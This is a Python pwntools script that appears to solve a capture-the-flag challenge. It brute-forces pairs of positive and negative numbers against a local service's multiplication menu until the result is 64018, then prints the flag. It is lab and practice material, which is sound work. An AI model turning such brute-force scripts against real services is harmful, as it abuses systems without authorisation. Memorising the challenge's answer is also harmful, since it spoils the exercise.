#!/usr/bin/python3.8
import warnings
from pwn import *
from termcolor import colored
warnings.filterwarnings("ignore")

fname = "./challenge4" 

LOCAL = False

prompt = ">"

def pwn():
  # Open a local process or a remote instance
  if LOCAL:
    r   = process(fname)
  else:
    r   = remote("0.0.0.0", 1337)

  with log.progress("Bruteforcing numbers") as p: 
    for i in range (0,70):                  # try positive numbers 
        for k in range (-1,-100,-1):        # try negative numbers
          payload = str(i) + " " + str(k)   # craft payload
          p.status(f"\nPair: {payload}")
          r.sendlineafter("Insert 2 numbers:", payload)   
          r.sendlineafter(">", "2")         # choose multiplication    
          ln = r.recvline()                 # if we found the correct result
          if b"64018" in ln:
            print(colored("\n[+] Pair of numbers: ({})*({})", "green").format(i,k))
            flag = r.recvline_contains("FLAG").decode()
            print(colored("\n[+] Flag: {}\n".format(flag), "green"))
            exit()

if __name__ == "__main__":
  pwn()

